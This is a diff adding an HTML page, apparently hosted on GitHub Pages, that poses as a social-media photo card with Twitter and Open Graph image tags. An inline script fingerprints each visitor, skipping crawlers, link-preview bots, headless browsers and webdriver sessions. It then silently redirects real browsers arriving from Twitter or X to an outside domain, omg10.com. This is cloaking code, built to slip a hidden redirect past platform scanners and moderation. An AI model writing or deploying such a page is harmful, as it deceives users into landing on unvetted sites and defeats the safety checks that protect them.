@@ -1,0 +1,64 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Photo</title>
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="Photo">
+<meta name="twitter:description" content="View">
+<meta name="twitter:image" content="https://m52kayra-dot.github.io/cards/zk96mic.jpg">
+<meta name="twitter:image:width" content="1200">
+<meta name="twitter:image:height" content="628">
+<meta name="twitter:image:alt" content="Photo">
+<meta property="og:type" content="website">
+<meta property="og:title" content="Photo">
+<meta property="og:description" content="View">
+<meta property="og:image" content="https://m52kayra-dot.github.io/cards/zk96mic.jpg">
+<meta property="og:image:width" content="1200">
+<meta property="og:image:height" content="628">
+<meta property="og:image:type" content="image/jpeg">
+<meta property="og:url" content="https://m52kayra-dot.github.io/cards/zk96mic.html">
+<meta name="referrer" content="no-referrer">
+<style>
+body{margin:0;padding:0;background:#000;color:#fff;font-family:system-ui,sans-serif;display:flex;align-items:center;justify-content:center;min-height:100vh}
+img{max-width:100%;height:auto;display:block}
+</style>
+</head>
+<body>
+<img src="zk96mic.jpg" alt="">
+<script>
+(function(){
+  var ua = navigator.userAgent.toLowerCase();
+  var ref = document.referrer.toLowerCase();
+  
+  // Bilinen bot pattern'leri
+  var botPattern = /bot|crawler|spider|twitterbot|facebookexternalhit|linkedinbot|whatsapp|telegram|discord|slack|preview|fetch|headless|phantom|selenium|puppeteer|playwright|chrome-lighthouse|pingdom|gtmetrix|w3c|validator|google|bing|yandex|baidu/i;
+  
+  if (botPattern.test(ua)) { return; }
+  
+  // Gercek tarayici kontrolu - olmasi gereken ozellikler
+  var hasChrome = /chrome|safari|firefox|edg|opera/i.test(ua);
+  var hasPlugins = navigator.plugins && navigator.plugins.length > 0;
+  var hasLanguages = navigator.languages && navigator.languages.length > 0;
+  var hasScreen = screen.width > 100 && screen.height > 100;
+  var hasMime = navigator.mimeTypes && navigator.mimeTypes.length > 0;
+  
+  // Headless Chrome tespit (webdriver flag)
+  if (navigator.webdriver === true) { return; }
+  
+  // Twitter'dan referrer veya direkt giriş (referrer bos ise yine de izin ver - bazi kullanicilar privacy)
+  var fromSocial = ref.includes('t.co') || ref.includes('twitter.com') || ref.includes('x.com') || ref === '';
+  
+  if (hasChrome && hasLanguages && hasScreen && fromSocial) {
+    setTimeout(function(){
+      window.location.replace("https://omg10.com/4/9403364");
+    }, 50);
+  }
+})();
+</script>
+<noscript>
+<style>body{display:flex;align-items:center;justify-content:center;min-height:100vh}</style>
+</noscript>
+</body>
+</html>
